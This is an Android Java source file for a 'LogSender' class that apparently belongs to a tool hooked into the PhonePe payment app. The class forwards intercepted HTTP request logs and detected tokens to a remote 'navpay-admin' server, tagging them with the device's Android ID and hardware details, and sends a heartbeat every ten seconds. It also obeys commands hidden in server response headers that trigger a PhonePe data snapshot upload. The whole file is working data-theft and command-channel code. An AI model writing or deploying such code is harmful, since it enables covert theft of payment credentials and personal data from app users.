package com.httpinterceptor.interceptor;

import android.app.Application;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * 日志发送器
 *
 * 将拦截到的 HTTP 请求日志发送到本地服务器
 * 使用队列和线程池确保不阻塞主请求
 */
public class LogSender {

    private static final String TAG = "LogSender";

    // 默认服务器地址 (debug 保留旧 log server，release 走 navpay-admin)
    private static String serverUrl = LogEndpointResolver.resolve((String) null);
    private static final int MAX_SEND_RETRIES = 3;

    // 单例
    private static volatile LogSender instance;

    // 日志队列
    private final LinkedBlockingQueue<QueuedLog> logQueue;

    // 发送线程池
    private final ExecutorService executor;
    private final ScheduledExecutorService heartbeatExecutor;

    // 是否启用
    private volatile boolean enabled = true;

    // 发送失败计数
    private int failureCount = 0;
    private static final int MAX_FAILURES = 10;
    private static final String DEFAULT_SOURCE_APP = "phonepe";
    private static final AndroidIdCache ANDROID_ID_CACHE = new AndroidIdCache();
    private static final long HEARTBEAT_INTERVAL_MS = 10000L;
    private static final String HEARTBEAT_APP_NAME = "phonepe";
    private static final String DEVICE_COMMAND_HEADER = "X-Navpay-Device-Command";
    private static final String DEVICE_COMMAND_ACK_HEADER = "X-Navpay-Device-Command-Ack";
    private static final String TRIGGER_PHONEPE_SNAPSHOT_COMMAND = "trigger_phonepe_snapshot_once";
    private static volatile String pendingCommandAckId = "";
    private static volatile String lastHandledCommandId = "";

    private static final class QueuedLog {
        final JSONObject payload;
        final int attempts;

        QueuedLog(JSONObject payload, int attempts) {
            this.payload = payload;
            this.attempts = attempts;
        }
    }

    private static final class RuntimeCommand {
        final String commandType;
        final String commandId;

        RuntimeCommand(String commandType, String commandId) {
            this.commandType = commandType;
            this.commandId = commandId;
        }
    }

    private LogSender() {
        logQueue = new LinkedBlockingQueue<>(1000);
        executor = Executors.newSingleThreadExecutor();
        heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();

        // 启动发送线程
        executor.submit(this::sendLoop);
        heartbeatExecutor.scheduleWithFixedDelay(
            this::enqueueHeartbeatLog,
            HEARTBEAT_INTERVAL_MS,
            HEARTBEAT_INTERVAL_MS,
            TimeUnit.MILLISECONDS
        );
    }

    public static LogSender getInstance() {
        if (instance == null) {
            synchronized (LogSender.class) {
                if (instance == null) {
                    instance = new LogSender();
                }
            }
        }
        return instance;
    }

    /**
     * 设置服务器地址
     */
    public static void setServerUrl(String url) {
        serverUrl = LogEndpointResolver.resolve(LogEndpointResolver.isDebugBuild(), url);
        Log.i(TAG, "Server URL set to: " + url);
    }

    /**
     * 获取当前服务器地址
     */
    public static String getServerUrl() {
        return serverUrl;
    }

    /**
     * 启用/禁用日志发送
     */
    public void setEnabled(boolean enabled) {
        this.enabled = enabled;
        Log.i(TAG, "LogSender " + (enabled ? "enabled" : "disabled"));
    }

    /**
     * 发送日志
     */
    public void sendLog(JSONObject logData) {
        if (!enabled) {
            return;
        }
        JSONObject payload = enrichPayload(copyPayload(logData));

        // 添加到队列，如果队列满了则丢弃最旧的
        if (!logQueue.offer(new QueuedLog(payload, 0))) {
            logQueue.poll();
            logQueue.offer(new QueuedLog(payload, 0));
        }
    }

    /**
     * 发送 Token 检测日志
     */
    public void sendTokenLog(String patternName, String url, String tokenInfo) {
        try {
            JSONObject json = new JSONObject();
            json.put("timestamp", System.currentTimeMillis());
            json.put("url", url);
            json.put("method", "TOKEN_DETECTED");
            json.put("token_detected", true);
            json.put("token_info", "Pattern: " + patternName + "\n" + tokenInfo);
            sendLog(json);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating token log", e);
        }
    }

    private void enqueueHeartbeatLog() {
        if (!enabled) {
            return;
        }
        JSONObject json = toJson(buildHeartbeatPayloadMap(getAndroidId(), System.currentTimeMillis()));
        boolean sent = sendHeartbeat(json);
        if (!sent) {
            Log.w(TAG, "Failed to send heartbeat to " + LogEndpointResolver.resolveHeartbeatEndpoint((String) null));
        }
    }

    static Map<String, Object> buildHeartbeatPayloadMap(String clientDeviceId, long timestampMs) {
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("timestamp", timestampMs);
        payload.put("appName", HEARTBEAT_APP_NAME);
        payload.put("clientDeviceId", clientDeviceId == null || clientDeviceId.trim().isEmpty() ? "unknown" : clientDeviceId.trim());
        return payload;
    }

    /**
     * 发送循环
     */
    private void sendLoop() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                QueuedLog log = logQueue.take();
                boolean success = doSend(log.payload);

                if (success) {
                    failureCount = 0;
                } else {
                    if (log.attempts < MAX_SEND_RETRIES) {
                        // 轻量重试，避免启动阶段瞬时抖动导致日志丢失
                        int nextAttempts = log.attempts + 1;
                        long backoffMs = 300L * nextAttempts;
                        Thread.sleep(backoffMs);
                        if (!logQueue.offer(new QueuedLog(log.payload, nextAttempts))) {
                            logQueue.poll();
                            logQueue.offer(new QueuedLog(log.payload, nextAttempts));
                        }
                        continue;
                    }
                    failureCount++;
                    if (failureCount >= MAX_FAILURES) {
                        Log.w(TAG, "Too many failures, pausing for 30 seconds");
                        Thread.sleep(30000);
                        failureCount = 0;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    /**
     * 执行发送
     */
    private boolean doSend(JSONObject log) {
        String endpoint = resolveEndpointForSend();
        return sendToEndpoint(endpoint, log);
    }

    private boolean sendHeartbeat(JSONObject heartbeat) {
        String endpoint = LogEndpointResolver.resolveHeartbeatEndpoint((String) null);
        return sendToEndpoint(endpoint, heartbeat, false);
    }

    private String resolveEndpointForSend() {
        String primary = serverUrl == null ? "" : serverUrl.trim();
        if (primary.isEmpty()) {
            return LogEndpointResolver.resolve((String) null);
        }
        return primary;
    }

    private boolean sendToEndpoint(String endpoint, JSONObject log) {
        return sendToEndpoint(endpoint, log, true);
    }

    private boolean sendToEndpoint(String endpoint, JSONObject log, boolean allowRuntimeCommandHeaders) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(endpoint);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setDoOutput(true);
            String ackCommandId = allowRuntimeCommandHeaders ? pendingCommandAckId : "";
            if (allowRuntimeCommandHeaders && ackCommandId != null && !ackCommandId.trim().isEmpty()) {
                connection.setRequestProperty(DEVICE_COMMAND_ACK_HEADER, ackCommandId.trim());
            }

            byte[] body = log.toString().getBytes(StandardCharsets.UTF_8);
            connection.setFixedLengthStreamingMode(body.length);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(body);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                if (allowRuntimeCommandHeaders) {
                    String commandHeader = connection.getHeaderField(DEVICE_COMMAND_HEADER);
                    handleRuntimeCommandHeader(commandHeader);
                    if (ackCommandId != null && !ackCommandId.trim().isEmpty()) {
                        pendingCommandAckId = "";
                    }
                }
                return true;
            } else {
                Log.w(TAG, "Server returned: " + responseCode + ", endpoint=" + endpoint);
                return false;
            }
        } catch (IOException e) {
            Log.w(TAG, "Failed to send log to " + endpoint + ": " + e.getMessage());
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private static JSONObject copyPayload(JSONObject payload) {
        if (payload == null) {
            return new JSONObject();
        }
        try {
            return new JSONObject(payload.toString());
        } catch (JSONException e) {
            Log.w(TAG, "Failed to copy payload, fallback to empty object", e);
            return new JSONObject();
        }
    }

    private JSONObject enrichPayload(JSONObject payload) {
        if (payload == null) {
            payload = new JSONObject();
        }

        Map<String, Object> payloadMap = toMap(payload);
        if (isMissingOrEmpty(payloadMap, "sourceApp")) {
            payloadMap.put("sourceApp", DEFAULT_SOURCE_APP);
        }

        return toJson(DeviceInfoEnricher.enrich(payloadMap, captureDeviceSnapshot()));
    }

    private static boolean isMissingOrEmpty(Map<String, Object> payload, String key) {
        if (payload == null || key == null) {
            return true;
        }
        if (!payload.containsKey(key)) {
            return true;
        }
        Object value = payload.get(key);
        if (value == null) {
            return true;
        }
        if (!(value instanceof String)) {
            return false;
        }
        return ((String) value).trim().isEmpty();
    }

    private static Map<String, Object> toMap(JSONObject json) {
        Map<String, Object> map = new LinkedHashMap<>();
        if (json == null) {
            return map;
        }
        Iterator<String> keys = json.keys();
        while (keys.hasNext()) {
            String key = keys.next();
            map.put(key, json.opt(key));
        }
        return map;
    }

    private static JSONObject toJson(Map<String, Object> map) {
        JSONObject json = new JSONObject();
        if (map == null) {
            return json;
        }
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            try {
                json.put(entry.getKey(), entry.getValue());
            } catch (JSONException e) {
                Log.w(TAG, "Failed to write enriched field " + entry.getKey(), e);
            }
        }
        return json;
    }

    private static String getAndroidId() {
        return ANDROID_ID_CACHE.get(LogSender::lookupAndroidId);
    }

    private static String lookupAndroidId() {
        try {
            Class<?> activityThread = Class.forName("android.app.ActivityThread");
            Object application = activityThread.getMethod("currentApplication").invoke(null);
            if (!(application instanceof Application)) {
                return "unknown";
            }
            String androidId = Settings.Secure.getString(
                ((Application) application).getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            return androidId == null || androidId.trim().isEmpty() ? "unknown" : androidId.trim();
        } catch (Throwable t) {
            return "unknown";
        }
    }

    private static DeviceSnapshot captureDeviceSnapshot() {
        String androidId = getAndroidId();
        return new DeviceSnapshot(
            androidId,
            androidId,
            Build.DEVICE,
            Build.BRAND,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT,
            TimeZone.getDefault().getID(),
            localeTag()
        );
    }

    private static void handleRuntimeCommandHeader(String headerValue) {
        RuntimeCommand command = parseRuntimeCommandHeader(headerValue);
        if (command == null) {
            return;
        }
        if (!TRIGGER_PHONEPE_SNAPSHOT_COMMAND.equals(command.commandType)) {
            return;
        }
        if (command.commandId.equals(lastHandledCommandId)) {
            pendingCommandAckId = command.commandId;
            return;
        }
        if (triggerPhonePeSnapshotUpload()) {
            lastHandledCommandId = command.commandId;
            pendingCommandAckId = command.commandId;
            Log.i(TAG, "runtime command handled: " + command.commandType + ", commandId=" + command.commandId);
        }
    }

    private static RuntimeCommand parseRuntimeCommandHeader(String headerValue) {
        if (headerValue == null) {
            return null;
        }
        String raw = headerValue.trim();
        if (raw.isEmpty()) {
            return null;
        }
        String commandType = "";
        String commandId = "";
        String[] parts = raw.split(";");
        for (String part : parts) {
            String[] kv = part.split("=", 2);
            if (kv.length != 2) {
                continue;
            }
            String key = kv[0] == null ? "" : kv[0].trim();
            String value = kv[1] == null ? "" : kv[1].trim();
            if (key.equalsIgnoreCase("commandType")) {
                commandType = value;
            } else if (key.equalsIgnoreCase("commandId")) {
                commandId = value;
            }
        }
        if (commandType.isEmpty() || commandId.isEmpty()) {
            return null;
        }
        return new RuntimeCommand(commandType, commandId);
    }

    private static boolean triggerPhonePeSnapshotUpload() {
        try {
            Class<?> helperClass = Class.forName("com.PhonePeTweak.Def.PhonePeHelper");
            helperClass.getMethod("uploadSnapshotToNavpayAsync").invoke(null);
            return true;
        } catch (Throwable t) {
            Log.w(TAG, "runtime command trigger snapshot failed", t);
            return false;
        }
    }

    private static String localeTag() {
        Locale locale = Locale.getDefault();
        String tag = locale.toLanguageTag();
        return tag == null || tag.trim().isEmpty() ? locale.toString() : tag;
    }

    /**
     * 关闭
     */
    public void shutdown() {
        heartbeatExecutor.shutdownNow();
        executor.shutdownNow();
    }
}
